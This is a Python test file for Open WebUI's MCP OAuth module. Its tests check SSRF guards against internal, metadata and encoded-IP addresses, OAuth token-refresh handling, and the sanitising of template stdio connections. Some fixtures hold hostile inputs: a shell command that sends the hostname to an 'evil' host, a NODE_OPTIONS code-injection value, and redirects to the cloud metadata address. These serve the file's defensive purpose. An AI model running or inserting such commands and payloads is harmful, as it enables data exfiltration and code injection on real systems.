import asyncio
import socket

import pytest

import open_webui.utils.mcp.oauth as oauth_mod
from open_webui.utils.mcp.oauth import (
    MCPOAuthError,
    _SSRFGuardedResolver,
    parse_www_authenticate,
    protected_resource_urls,
    ssrf_guarded_connector,
    validate_public_url,
)


def _run(coro):
    return asyncio.run(coro)


def test_parse_www_authenticate_resource_metadata():
    header = (
        'Bearer realm="OAuth", '
        'resource_metadata="https://mcp.example.com/.well-known/oauth-protected-resource/mcp", '
        'error="invalid_token"'
    )

    parsed = parse_www_authenticate(header)

    assert parsed["realm"] == "OAuth"
    assert parsed["resource_metadata"] == "https://mcp.example.com/.well-known/oauth-protected-resource/mcp"
    assert parsed["error"] == "invalid_token"


def test_protected_resource_urls_path_first_then_root():
    assert protected_resource_urls("https://mcp.notion.com/mcp") == [
        "https://mcp.notion.com/.well-known/oauth-protected-resource/mcp",
        "https://mcp.notion.com/.well-known/oauth-protected-resource",
    ]


def test_validate_public_url_blocks_link_local_metadata():
    with pytest.raises(MCPOAuthError):
        _run(validate_public_url("http://169.254.169.254/latest/meta-data"))


def test_validate_public_url_blocks_decimal_ip_bypass():
    # 2130706433 == 127.0.0.1; getaddrinfo normalizes the integer literal, which
    # the old string-only check missed (audit E3).
    with pytest.raises(MCPOAuthError):
        _run(validate_public_url("https://2130706433/"))


def test_validate_public_url_blocks_octal_ip_bypass():
    with pytest.raises(MCPOAuthError):
        _run(validate_public_url("https://0177.0.0.1/"))


def test_validate_public_url_blocks_cgnat():
    # RFC 6598 CGNAT 100.64.0.0/10 is not is_private but is not globally routable.
    with pytest.raises(MCPOAuthError):
        _run(validate_public_url("https://100.64.0.1/"))


def test_validate_public_url_blocks_v4mapped_metadata():
    # ::ffff:169.254.169.254 — the embedded v4 link-local must be unmapped.
    with pytest.raises(MCPOAuthError):
        _run(validate_public_url("https://[::ffff:169.254.169.254]/"))


def test_validate_public_url_blocks_private_https():
    with pytest.raises(MCPOAuthError):
        _run(validate_public_url("https://10.1.2.3/mcp"))


def test_validate_public_url_allows_public_literal():
    # Literal public IP — no DNS needed, hermetic.
    _run(validate_public_url("https://8.8.8.8/"))


def test_validate_public_url_requires_https():
    with pytest.raises(MCPOAuthError):
        _run(validate_public_url("http://8.8.8.8/"))


def test_validate_public_url_allowlist_permits_private(monkeypatch):
    monkeypatch.setattr(oauth_mod, "MCP_ALLOWED_PRIVATE_HOSTS", ["10.0.0.0/8"])
    # Should not raise: 10.1.2.3 is in the admin allowlist.
    _run(validate_public_url("https://10.1.2.3/mcp"))


def test_validate_public_url_allowlist_is_per_ip(monkeypatch):
    """Round-5: an allowlisted-CIDR IP must NOT whitelist a co-resolved forbidden
    IP — otherwise the httpx transport pins/dials the forbidden one."""
    import ipaddress as _ip

    monkeypatch.setattr(oauth_mod, "MCP_ALLOWED_PRIVATE_HOSTS", ["10.0.0.0/8"])

    async def fake_resolve_mixed(host):
        return [_ip.ip_address("10.0.0.5"), _ip.ip_address("169.254.169.254")]

    monkeypatch.setattr(oauth_mod, "_resolve_host", fake_resolve_mixed)
    with pytest.raises(MCPOAuthError):
        _run(validate_public_url("https://mixed.example/"))

    # A host resolving ONLY to allowlisted IPs is allowed and returns just those.
    async def fake_resolve_ok(host):
        return [_ip.ip_address("10.1.2.3")]

    monkeypatch.setattr(oauth_mod, "_resolve_host", fake_resolve_ok)
    assert _run(validate_public_url("https://ok.example/")) == ["10.1.2.3"]


def test_validate_public_url_allow_localhost_permits_loopback():
    _run(validate_public_url("http://127.0.0.1:9000/mcp", allow_localhost=True))
    with pytest.raises(MCPOAuthError):
        _run(validate_public_url("http://127.0.0.1:9000/mcp", allow_localhost=False))


# --- SSRF-guarded resolver -----------------------------------------------------
# The resolver is what aiohttp consults at the REAL connect time (initial host +
# every redirect hop), closing the DNS-rebind TOCTOU and redirect-to-internal
# gaps that the one-shot validate_public_url pre-flight cannot. These are
# hermetic: IP literals resolve locally via getaddrinfo, no network.


async def _resolve(resolver, host, family=socket.AF_INET):
    try:
        return await resolver.resolve(host, 443, family=family)
    finally:
        await resolver.close()


def test_guarded_resolver_allows_public_literal():
    res = _run(_resolve(_SSRFGuardedResolver(), "8.8.8.8"))
    assert [i["host"] for i in res] == ["8.8.8.8"]


@pytest.mark.parametrize(
    "blocked",
    ["10.0.0.1", "127.0.0.1", "169.254.169.254", "100.64.1.1", "::1"],
)
def test_guarded_resolver_blocks_internal(blocked):
    fam = socket.AF_INET6 if ":" in blocked else socket.AF_INET
    with pytest.raises(OSError):
        _run(_resolve(_SSRFGuardedResolver(), blocked, family=fam))


def test_guarded_resolver_allow_localhost_permits_loopback():
    res = _run(_resolve(_SSRFGuardedResolver(allow_localhost=True), "127.0.0.1"))
    assert [i["host"] for i in res] == ["127.0.0.1"]
    # ...but a non-loopback private address stays blocked even with the flag.
    with pytest.raises(OSError):
        _run(_resolve(_SSRFGuardedResolver(allow_localhost=True), "10.0.0.1"))


def test_guarded_resolver_extra_allow_permits_private_cidr():
    res = _run(_resolve(_SSRFGuardedResolver(extra_allow=["10.0.0.0/8"]), "10.1.2.3"))
    assert [i["host"] for i in res] == ["10.1.2.3"]


def test_guarded_resolver_honors_admin_allowlist(monkeypatch):
    monkeypatch.setattr(oauth_mod, "MCP_ALLOWED_PRIVATE_HOSTS", ["192.168.0.0/16"])
    res = _run(_resolve(_SSRFGuardedResolver(), "192.168.5.5"))
    assert [i["host"] for i in res] == ["192.168.5.5"]


def test_guarded_connector_installs_guarded_resolver():
    # TCPConnector grabs the running loop at construction, so build + close it
    # inside one (mirrors production, where it is only ever made in an endpoint).
    async def _build_and_check():
        conn = ssrf_guarded_connector(
            allow_localhost=True, extra_allow=["172.16.0.0/12"]
        )
        try:
            assert isinstance(conn._resolver, _SSRFGuardedResolver)
            assert conn._resolver._allow_localhost is True
            assert conn._resolver._extra_allow == ["172.16.0.0/12"]
        finally:
            await conn.close()

    _run(_build_and_check())


# --- OAuth callback: persist failure must not report "connected" ---------------


def _import_router_or_skip():
    try:
        import open_webui.routers.mcp as m

        return m
    except Exception as exc:  # DATABASE_URL unset etc. — keep this file hermetic
        pytest.skip(f"router import unavailable: {exc}")


def _callback_fixtures():
    from types import SimpleNamespace

    conn = SimpleNamespace(
        id="cid",
        user_id="uid",
        policy={},
        oauth={
            "state": "S",
            "redirect_uri": "https://owui.example/oauth/mcp/cid/callback",
            "return_to": "/c/1",
        },
    )
    req = SimpleNamespace(
        query_params={"state": "S", "code": "C"},
        app=SimpleNamespace(
            state=SimpleNamespace(
                config=SimpleNamespace(WEBUI_URL="https://owui.example")
            )
        ),
        base_url="https://owui.example/",
    )
    return conn, req


def _wire_callback(monkeypatch, mcp_mod, conn, saved):
    async def fake_get(*a, **k):
        return conn

    async def fake_exchange(*a, **k):
        return {"access_token": "tok", "expires_in": 3600}

    async def fake_merge(*a, **k):
        return saved

    monkeypatch.setattr(mcp_mod.MCPConnections, "get_connection_by_id", fake_get)
    monkeypatch.setattr(mcp_mod, "exchange_code", fake_exchange)
    # The callback persists via the row-locked merge (returns a bool).
    monkeypatch.setattr(
        mcp_mod.MCPConnections, "merge_oauth_fields_by_id_and_user_id", fake_merge
    )


def test_oauth_callback_reports_persist_failure(monkeypatch):
    # The single-use code is spent at exchange_code; if the token DB write then
    # fails (returns False), the callback must surface an error, not a false
    # "connected" while the freshly-issued tokens were lost.
    mcp_mod = _import_router_or_skip()
    conn, req = _callback_fixtures()
    _wire_callback(monkeypatch, mcp_mod, conn, saved=False)
    resp = _run(mcp_mod.mcp_oauth_callback("cid", req))
    assert "mcp_oauth_error=persist_failed" in resp.headers["location"]
    assert "mcp_oauth=connected" not in resp.headers["location"]


def test_oauth_callback_connected_on_persist_success(monkeypatch):
    mcp_mod = _import_router_or_skip()
    conn, req = _callback_fixtures()
    _wire_callback(monkeypatch, mcp_mod, conn, saved=True)
    resp = _run(mcp_mod.mcp_oauth_callback("cid", req))
    assert "mcp_oauth=connected" in resp.headers["location"]


# --- fetch_json manual redirect handling (literal-IP SSRF + POST no-follow) ----
# A redirect Location that is a literal internal IP bypasses aiohttp's resolver
# (it short-circuits IP literals), so fetch_json must re-validate every hop.


class _FakeResp:
    def __init__(self, status, headers=None, body="{}"):
        self.status = status
        self.headers = headers or {}
        self._body = body

    async def text(self):
        return self._body

    async def json(self):
        import json as _json

        return _json.loads(self._body)

    async def __aenter__(self):
        return self

    async def __aexit__(self, *a):
        return False


def _fake_session_factory(script):
    state = {"i": 0}

    class _FakeSession:
        def __init__(self, *a, **k):
            pass

        def request(self, method, url, **k):
            resp = script[min(state["i"], len(script) - 1)]
            state["i"] += 1
            return resp

        async def __aenter__(self):
            return self

        async def __aexit__(self, *a):
            return False

    return _FakeSession


def test_fetch_json_revalidates_literal_ip_redirect_hop(monkeypatch):
    import open_webui.utils.mcp.oauth as om

    seen = []

    async def fake_validate(url, **k):
        seen.append(url)
        if "169.254.169.254" in url:
            raise om.MCPOAuthError("blocked internal")

    monkeypatch.setattr(om, "validate_public_url", fake_validate)
    monkeypatch.setattr(om, "ssrf_guarded_connector", lambda **k: None)
    monkeypatch.setattr(
        om.aiohttp,
        "ClientSession",
        _fake_session_factory(
            [_FakeResp(302, {"Location": "http://169.254.169.254/meta"})]
        ),
    )
    with pytest.raises(om.MCPOAuthError):
        _run(om.fetch_json("https://attacker.example/prm"))
    # Both the initial public URL AND the literal-IP redirect target were validated.
    assert any("attacker.example" in u for u in seen)
    assert any("169.254.169.254" in u for u in seen)


def test_fetch_json_post_does_not_follow_redirect(monkeypatch):
    import open_webui.utils.mcp.oauth as om

    seen = []

    async def fake_validate(url, **k):
        seen.append(url)

    monkeypatch.setattr(om, "validate_public_url", fake_validate)
    monkeypatch.setattr(om, "ssrf_guarded_connector", lambda **k: None)
    monkeypatch.setattr(
        om.aiohttp,
        "ClientSession",
        _fake_session_factory(
            [_FakeResp(307, {"Location": "https://evil.example/x"}, "no")]
        ),
    )
    with pytest.raises(om.MCPOAuthHTTPError):
        _run(
            om.fetch_json(
                "https://provider.example/token", method="POST", data="grant=x"
            )
        )
    # The secret-bearing POST validated only its own URL; redirect NOT followed.
    assert seen == ["https://provider.example/token"]


def test_guarded_httpx_transport_blocks_internal_ip():
    from open_webui.utils.mcp.oauth import (
        guarded_httpx_client_factory,
        _SSRFGuardedAsyncTransport,
    )
    import httpx

    async def _check():
        client = guarded_httpx_client_factory()(headers=None, timeout=None, auth=None)
        try:
            assert client.follow_redirects is True
            assert client.timeout.read is None
            assert isinstance(client._transport, _SSRFGuardedAsyncTransport)
            with pytest.raises(MCPOAuthError):
                await client._transport.handle_async_request(
                    httpx.Request("GET", "https://10.0.0.1/x")
                )
        finally:
            await client.aclose()

    _run(_check())


def test_discover_routes_through_fetch_json(monkeypatch):
    """Round-3 bug 1: /discover must use fetch_json (per-hop re-validation) so a
    redirect to a literal internal IP cannot bypass the SSRF guard."""
    mcp_mod = _import_router_or_skip()
    captured = {}

    async def fake_validate(url, **k):
        return None

    async def fake_fetch(url, **k):
        captured["url"] = url
        return {
            "name": "X",
            "description": "d",
            "icon": "i",
            "endpoint": "https://mcp.x/mcp",
        }

    monkeypatch.setattr(mcp_mod, "validate_public_url", fake_validate)
    monkeypatch.setattr(mcp_mod, "fetch_json", fake_fetch)
    out = _run(
        mcp_mod.discover_mcp_url(
            mcp_mod.MCPDiscoverForm(url="https://mcp.x/"), user=object()
        )
    )
    assert out["endpoint"] == "https://mcp.x/mcp"
    # The fetched URL is the well-known doc, routed through the hardened fetch_json.
    assert captured["url"].endswith("/.well-known/mcp.json")


def _admin_mgr(monkeypatch):
    import open_webui.utils.oauth as ao
    from types import SimpleNamespace

    mgr = ao.OAuthClientManager(
        SimpleNamespace(state=SimpleNamespace(config=SimpleNamespace()))
    )
    monkeypatch.setattr(
        mgr, "get_client", lambda cid: SimpleNamespace(client_id="cid", client_secret=None)
    )
    monkeypatch.setattr(mgr, "get_token_endpoint", lambda cid: "https://as.example/token")
    monkeypatch.setattr(
        mgr,
        "get_server_metadata_url",
        lambda cid: "https://as.example/.well-known/oauth-authorization-server",
    )
    return ao, mgr


def test_admin_oauth_refresh_uses_shared_grant(monkeypatch):
    """B6 convergence: the admin OAuthClientManager delegates the refresh POST to
    the SHARED request_refresh_grant (so HTTP / expires_at can't drift from the
    per-user path) and then applies its own session post-processing."""
    try:
        ao, mgr = _admin_mgr(monkeypatch)
    except Exception as exc:  # needs DATABASE_URL set to import
        pytest.skip(f"admin oauth import unavailable: {exc}")
    from types import SimpleNamespace

    captured = {}

    async def fake_grant(
        token_endpoint, *, client_id, refresh_token, extra_data=None, extra_allow=None, **k
    ):
        captured.update(endpoint=token_endpoint, client_id=client_id, refresh=refresh_token)
        # request_refresh_grant's contract: always returns a NOT-NULL expires_at.
        return {"access_token": "new-access", "refresh_token": "rotated", "expires_at": 9999999999}

    monkeypatch.setattr(ao, "_request_refresh_grant", fake_grant)
    out = _run(
        mgr._perform_token_refresh(
            SimpleNamespace(id="s1", provider="cid", token={"refresh_token": "r1"})
        )
    )
    assert out["access_token"] == "new-access"
    assert out["refresh_token"] == "rotated"
    assert isinstance(out["expires_at"], int) and out["expires_at"] > 0
    assert "issued_at" in out
    assert captured == {
        "endpoint": "https://as.example/token",
        "client_id": "cid",
        "refresh": "r1",
    }


def test_admin_oauth_refresh_terminal_returns_none(monkeypatch):
    """A terminal token error (invalid_grant) => None so the caller deletes the
    session — classified by the SHARED is_terminal_token_error."""
    try:
        ao, mgr = _admin_mgr(monkeypatch)
    except Exception as exc:
        pytest.skip(f"admin oauth import unavailable: {exc}")
    from types import SimpleNamespace
    from open_webui.utils.mcp.oauth import MCPOAuthHTTPError

    async def fake_grant(*a, **k):
        raise MCPOAuthHTTPError(
            400, '{"error":"invalid_grant"}', "https://as.example/token"
        )

    monkeypatch.setattr(ao, "_request_refresh_grant", fake_grant)
    out = _run(
        mgr._perform_token_refresh(
            SimpleNamespace(id="s1", provider="cid", token={"refresh_token": "r1"})
        )
    )
    assert out is None


def test_admin_oauth_refresh_transient_raises(monkeypatch):
    """A non-terminal token error (5xx) => OAuthRefreshTransientError (keep the
    session rather than delete it)."""
    try:
        ao, mgr = _admin_mgr(monkeypatch)
    except Exception as exc:
        pytest.skip(f"admin oauth import unavailable: {exc}")
    from types import SimpleNamespace
    from open_webui.utils.mcp.oauth import MCPOAuthHTTPError

    async def fake_grant(*a, **k):
        raise MCPOAuthHTTPError(503, "upstream down", "https://as.example/token")

    monkeypatch.setattr(ao, "_request_refresh_grant", fake_grant)
    with pytest.raises(ao.OAuthRefreshTransientError):
        _run(
            mgr._perform_token_refresh(
                SimpleNamespace(id="s1", provider="cid", token={"refresh_token": "r1"})
            )
        )


def test_admin_refresh_persist_failure_deletes_session(monkeypatch):
    """Round-8 bug B: when a successful (rotating) refresh can't be persisted, the
    admin path must DELETE the session + force re-auth — not keep the now-dead
    refresh token to be replayed (which revokes the Notion grant)."""
    try:
        ao, mgr = _admin_mgr(monkeypatch)
    except Exception as exc:
        pytest.skip(f"admin oauth import unavailable: {exc}")
    from types import SimpleNamespace

    async def fake_perform(session):
        return {"access_token": "new", "refresh_token": "rotated", "expires_at": 9999999999}

    async def fail_update(_id, _token):
        return None

    deleted = {}

    async def fake_delete(_id):
        deleted["id"] = _id
        return True

    monkeypatch.setattr(mgr, "_perform_token_refresh", fake_perform)
    monkeypatch.setattr(ao.OAuthSessions, "update_session_by_id", fail_update)
    monkeypatch.setattr(ao.OAuthSessions, "delete_session_by_id", fake_delete)
    out = _run(
        mgr._refresh_token(
            SimpleNamespace(id="sess-1", provider="cid", token={"refresh_token": "r1"})
        )
    )
    assert out is None
    assert deleted.get("id") == "sess-1"


def test_list_specs_apply_filter_controls_visibility(monkeypatch):
    """The tool-manager's ?all=true path (_list_specs apply_filter=False) returns
    the FULL upstream catalog; the default applies tool_allowed_by_policy."""
    mcp_mod = _import_router_or_skip()
    from types import SimpleNamespace

    specs = [
        {"name": "a", "annotations": {"readOnlyHint": True}},
        {"name": "b", "annotations": {"readOnlyHint": True}},
    ]

    class FakeClient:
        async def connect(self, **k):
            return None

        async def list_tool_specs(self):
            return specs

        async def disconnect(self):
            return None

    async def fake_kwargs(conn, **k):
        return {"url": "https://x/mcp", "transport": "remote_http"}

    monkeypatch.setattr(mcp_mod, "MCPClient", lambda: FakeClient())
    monkeypatch.setattr(mcp_mod, "build_personal_mcp_connect_kwargs", fake_kwargs)

    conn = SimpleNamespace(tool_filters={"include": ["a"]}, policy={}, transport="remote_http")
    # Filtered (default): only the allowlisted tool.
    assert [s["name"] for s in _run(mcp_mod._list_specs(conn, apply_filter=True))] == ["a"]
    # Unfiltered (all=true): the full catalog so the manager can show toggles.
    assert [s["name"] for s in _run(mcp_mod._list_specs(conn, apply_filter=False))] == [
        "a",
        "b",
    ]


def test_request_refresh_grant_defaults_expires_at(monkeypatch):
    """The shared primitive guarantees a NOT-NULL-safe expires_at even when the
    provider omits expires_in (Notion non-expiring tokens) — the single place both
    OAuth paths now get this from."""
    import open_webui.utils.mcp.oauth as om

    async def fake_validate(url, **k):
        return ["203.0.113.7"]

    monkeypatch.setattr(om, "validate_public_url", fake_validate)
    monkeypatch.setattr(om, "ssrf_guarded_connector", lambda **k: None)
    monkeypatch.setattr(
        om.aiohttp,
        "ClientSession",
        _fake_session_factory(
            [_FakeResp(200, {}, '{"access_token":"a","refresh_token":"r"}')]
        ),
    )
    out = _run(
        om.request_refresh_grant(
            "https://as.example/token", client_id="c", refresh_token="r0"
        )
    )
    assert out["access_token"] == "a"
    assert isinstance(out["expires_at"], int) and out["expires_at"] > 0


def test_guarded_httpx_transport_pins_vetted_ip(monkeypatch):
    """Round-4 bug B: the httpx transport must DIAL the exact IP that validation
    vetted (no rebind window), with Host + TLS SNI kept on the hostname."""
    import open_webui.utils.mcp.oauth as om
    import httpx

    async def fake_validate(url, **k):
        return ["203.0.113.7"]

    monkeypatch.setattr(om, "validate_public_url", fake_validate)

    captured = {}

    async def fake_super(self, request):
        captured["host"] = request.url.host
        captured["sni"] = request.extensions.get("sni_hostname")
        captured["hosthdr"] = request.headers.get("Host")
        return httpx.Response(200)

    monkeypatch.setattr(httpx.AsyncHTTPTransport, "handle_async_request", fake_super)

    async def _check():
        t = om._SSRFGuardedAsyncTransport()
        await t.handle_async_request(httpx.Request("GET", "https://mcp.example.com/x"))

    _run(_check())
    assert captured["host"] == "203.0.113.7"  # dialed the vetted IP
    assert captured["sni"] == "mcp.example.com"  # cert verifies against hostname
    assert captured["hosthdr"] == "mcp.example.com"


def test_validate_form_rejects_template_with_command():
    """Round-4 bug A: a template stdio connection may NOT carry its own
    command/args (the privilege-escalation vector); rejected at validation."""
    mcp_mod = _import_router_or_skip()
    from open_webui.models.mcp import MCPConnectionForm
    from types import SimpleNamespace
    from fastapi import HTTPException

    form = MCPConnectionForm(
        name="x",
        transport="stdio",
        auth_type="none",
        meta={"template": "slack"},
        command="/bin/sh",
        args=["-c", "id"],
    )
    req = SimpleNamespace(
        app=SimpleNamespace(
            state=SimpleNamespace(config=SimpleNamespace(USER_PERMISSIONS={}))
        )
    )
    user = SimpleNamespace(id="u1", role="user")
    with pytest.raises(HTTPException) as ei:
        mcp_mod._validate_form(form, user, req)
    assert ei.value.status_code == 400


def test_template_stdio_ignores_user_command_and_strips_dangerous_env(
    monkeypatch, tmp_path
):
    """Round-4 bug A (keystone): at the execution point, a template's command/args
    are authoritative — the stored command/args are ignored — and code-injection
    env vars (NODE_OPTIONS/LD_PRELOAD/...) the user supplied are stripped."""
    try:
        import open_webui.utils.mcp.connections as C
    except Exception as exc:
        pytest.skip(f"connections import unavailable: {exc}")
    from types import SimpleNamespace

    monkeypatch.setattr(C, "mcp_home", lambda *a, **k: tmp_path)
    monkeypatch.setattr(
        C, "_write_node_stdio_preload", lambda home: str(tmp_path / "preload.js")
    )
    conn = SimpleNamespace(
        transport="stdio",
        url=None,
        auth_type="none",
        key=None,
        headers=None,
        policy={},
        meta={"template": "outlook-assistant"},
        env={"NODE_OPTIONS": "--require /tmp/evil.js", "OUTLOOK_TOKEN": "secret"},
        command="/bin/sh",
        args=["-c", "curl http://evil/$(hostname)"],
        cwd=None,
        user_id="u1",
        id="c1",
    )
    out = _run(C.build_personal_mcp_connect_kwargs(conn))
    assert out["command"] == "npx"  # template command, NOT the user's /bin/sh
    assert out["args"][:2] == ["-y", "@littlebearapps/outlook-assistant"]
    # The user's NODE_OPTIONS injection is gone (template may add its own safe one).
    assert "/tmp/evil.js" not in (out["env"].get("NODE_OPTIONS") or "")
    # A legitimate template secret the user supplied is preserved.
    assert out["env"].get("OUTLOOK_TOKEN") == "secret"
